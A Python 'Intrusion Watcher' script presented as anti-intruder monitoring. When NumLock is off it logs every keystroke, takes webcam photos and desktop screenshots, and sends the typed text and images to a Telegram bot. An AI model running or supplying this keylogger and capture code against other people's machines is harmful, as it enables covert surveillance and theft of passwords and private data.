#!/usr/bin/env python3
"""
Intrusion Watcher with Local Logging
------------------------------------
Monitors keyboard and mouse activity using evdev.  
When NumLock is OFF, any activity triggers:
  - Keylogger (append typed characters to buffer and log file)
  - Webcam capture (fswebcam)
  - Desktop screenshot (scrot)
  - Telegram alert (message + media)

Features:
  - NumLock acts as ON/OFF switch for monitoring
  - Global cooldown: 3s between alerts
  - Local log file with timestamps of typed keys

Setup:
    sudo apt install fswebcam scrot python3-evdev
    pip install requests
Environment variables:
    TG_BOT_TOKEN = "<telegram bot token>"
    TG_CHAT_ID   = "<chat id or group id>"
"""

import os
import time
import subprocess
import requests
from pathlib import Path
from evdev import InputDevice, list_devices, ecodes
from select import select

# =====================
# Telegram integration
# =====================

TELEGRAM_TOKEN = os.getenv("TG_BOT_TOKEN")
CHAT_ID = os.getenv("TG_CHAT_ID")

if not TELEGRAM_TOKEN or not CHAT_ID:
    raise RuntimeError("⚠️ Environment variables TG_BOT_TOKEN and TG_CHAT_ID are required")

def send_telegram_message(msg: str) -> None:
    """Send a plain text message to Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg}, timeout=5)
    except Exception as e:
        print("Telegram message error:", e)

def send_telegram_photo(photo_path: str, caption: str = "") -> None:
    """Send a photo with optional caption to Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
    try:
        with open(photo_path, "rb") as f:
            requests.post(url, data={"chat_id": CHAT_ID, "caption": caption},
                          files={"photo": f}, timeout=10)
    except Exception as e:
        print("Telegram photo error:", e)

# =====================
# Keylogger setup
# =====================

KEYMAP = {
    ecodes.KEY_A: "a", ecodes.KEY_B: "b", ecodes.KEY_C: "c", ecodes.KEY_D: "d",
    ecodes.KEY_E: "e", ecodes.KEY_F: "f", ecodes.KEY_G: "g", ecodes.KEY_H: "h",
    ecodes.KEY_I: "i", ecodes.KEY_J: "j", ecodes.KEY_K: "k", ecodes.KEY_L: "l",
    ecodes.KEY_M: "m", ecodes.KEY_N: "n", ecodes.KEY_O: "o", ecodes.KEY_P: "p",
    ecodes.KEY_Q: "q", ecodes.KEY_R: "r", ecodes.KEY_S: "s", ecodes.KEY_T: "t",
    ecodes.KEY_U: "u", ecodes.KEY_V: "v", ecodes.KEY_W: "w", ecodes.KEY_X: "x",
    ecodes.KEY_Y: "y", ecodes.KEY_Z: "z",
    ecodes.KEY_1: "1", ecodes.KEY_2: "2", ecodes.KEY_3: "3", ecodes.KEY_4: "4",
    ecodes.KEY_5: "5", ecodes.KEY_6: "6", ecodes.KEY_7: "7", ecodes.KEY_8: "8",
    ecodes.KEY_9: "9", ecodes.KEY_0: "0",
    ecodes.KEY_SPACE: " ",
    ecodes.KEY_ENTER: "\n",
    ecodes.KEY_BACKSPACE: "[BS]",
}

# =====================
# Capture + logging
# =====================

OUTPUT_DIR = Path.home() / "security"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = OUTPUT_DIR / "intrusion_log.txt"

def append_to_log(entry: str) -> None:
    """Append a timestamped entry to the local log file."""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {entry}\n")

def take_screenshot() -> Path:
    """Capture a screenshot of the desktop using scrot."""
    ts = time.strftime("%Y%m%d_%H%M%S")
    filename = OUTPUT_DIR / f"screenshot_{ts}.png"
    subprocess.run(["scrot", str(filename)])
    return filename

def take_webcam_photo(source: str) -> Path:
    """Capture a webcam picture using fswebcam."""
    filename = OUTPUT_DIR / f"intrusion_{source}_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
    subprocess.run(["fswebcam", str(filename)])
    return filename

# =====================
# Intrusion handling
# =====================

last_intrusion_time = 0  # cooldown timer
typed_buffer = ""        # accumulate typed text

def record_intrusion(source: str, typed_text: str = "") -> None:
    """Handle an intrusion event: capture media, log locally, and notify Telegram."""
    global last_intrusion_time
    now = time.time()

    # Cooldown: avoid spamming
    if now - last_intrusion_time < 3:
        return
    last_intrusion_time = now

    ts = time.strftime("%Y-%m-%d %H:%M:%S")

    # Capture media
    photo_file = take_webcam_photo(source)
    screenshot_file = take_screenshot()

    # Prepare caption
    caption = f"Intrusion via {source} at {ts}"
    if typed_text:
        caption += f"\nTyped so far: {typed_text}"

    # Local logging
    append_to_log(caption)

    # Send to Telegram
    send_telegram_message(caption)
    send_telegram_photo(str(photo_file), caption="📷 Webcam")
    send_telegram_photo(str(screenshot_file), caption="🖥️ Screenshot")

# =====================
# Device auto-detection
# =====================

keyboards, mice, numlock_dev = [], [], None
for path in list_devices():
    dev = InputDevice(path)
    caps = dev.capabilities()

    if ecodes.EV_LED in caps and ecodes.LED_NUML in caps[ecodes.EV_LED]:
        numlock_dev = dev
        print(f"[+] NumLock device: {dev.path} ({dev.name})")

    if ecodes.EV_KEY in caps and ecodes.KEY_A in caps[ecodes.EV_KEY]:
        keyboards.append(dev)
        print(f"[+] Keyboard: {dev.path} ({dev.name})")

    if (ecodes.EV_REL in caps) or (ecodes.EV_KEY in caps and ecodes.BTN_LEFT in caps[ecodes.EV_KEY]):
        mice.append(dev)
        print(f"[+] Mouse: {dev.path} ({dev.name})")

devices = []
if numlock_dev: devices.append(numlock_dev)
devices.extend(keyboards)
devices.extend(mice)
fds = {dev.fd: dev for dev in devices}

numlock_on = ecodes.LED_NUML in numlock_dev.leds() if numlock_dev else False

print("🎯 Intrusion Watcher running (active when NumLock OFF, cooldown 3s)")

# =====================
# Main event loop
# =====================

while True:
    r, _, _ = select(fds, [], [])
    for fd in r:
        dev = fds[fd]
        for event in dev.read():
            # NumLock toggle
            if dev == numlock_dev and event.type == ecodes.EV_LED and event.code == ecodes.LED_NUML:
                numlock_on = bool(event.value)
                print("NumLock =", "ON" if numlock_on else "OFF")
                continue

            if not numlock_on:
                # Keyboard handling
                if dev in keyboards and event.type == ecodes.EV_KEY and event.value == 1:
                    char = KEYMAP.get(event.code, f"[{event.code}]")
                    typed_buffer += char
                    append_to_log(f"Key pressed: {char}")
                    record_intrusion("keyboard", typed_buffer)

                # Mouse handling
                elif dev in mice:
                    if event.type == ecodes.EV_KEY and event.value == 1:
                        append_to_log("Mouse click detected")
                        record_intrusion("mouse_click", typed_buffer)
                    elif event.type == ecodes.EV_REL:
                        append_to_log("Mouse movement detected")
                        record_intrusion("mouse_move", typed_buffer)
